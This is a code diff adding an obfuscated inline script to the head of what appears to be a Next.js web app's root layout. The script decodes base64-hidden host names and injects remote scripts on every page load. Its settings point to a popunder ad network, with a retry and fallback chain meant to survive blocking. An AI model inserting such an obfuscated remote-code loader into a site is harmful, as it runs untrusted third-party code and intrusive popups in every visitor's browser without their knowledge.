@@ -40,6 +40,17 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en">
+      <head>
+      <script type="text/javascript" data-cfasync="false"
+      dangerouslySetInnerHTML={{
+        __html: `/*<![CDATA[/* */
+        (function(){var m=window,g="dbf0741ca4c88dfb7b1dcff8566b374b",b=[["siteId",155+448*643+631+232+4787194],["minBid",0],["popundersPerIP","0"],["delayBetween",10],["default",false],["defaultPerDay",0],["topmostLayer","never"]],h=["d3d3LmNkbjRhZHMuY29tL2ltZHVpLm1pbi5jc3M=","ZDNnNW92Zm5nanc5YncuY2xvdWRmcm9udC5uZXQvc2NyaXB0cy9qc21va2UubWluLmpz"],l=-1,q,z,u=function(){clearTimeout(z);l++;if(h[l]&&!(1734756216000<(new Date).getTime()&&1<l)){q=m.document.createElement("script");q.type="text/javascript";q.async=!0;var a=m.document.getElementsByTagName("script")[0];q.src="https://"+atob(h[l]);q.crossOrigin="anonymous";q.onerror=u;q.onload=function(){clearTimeout(z);m[g.slice(0,16)+g.slice(0,16)]||u()};z=setTimeout(u,5E3);a.parentNode.insertBefore(q,a)}};if(!m[g]){try{Object.freeze(m[g]=b)}catch(e){}u()}})();
+        /*]]>/* */`,
+      }}
+      >
+
+    </script>
+      </head>
       <body className={inter.className}>
         {/* <ThemeProvider> */}
         <GoogleAnalytics gaId="G-8BC39G02XL" />
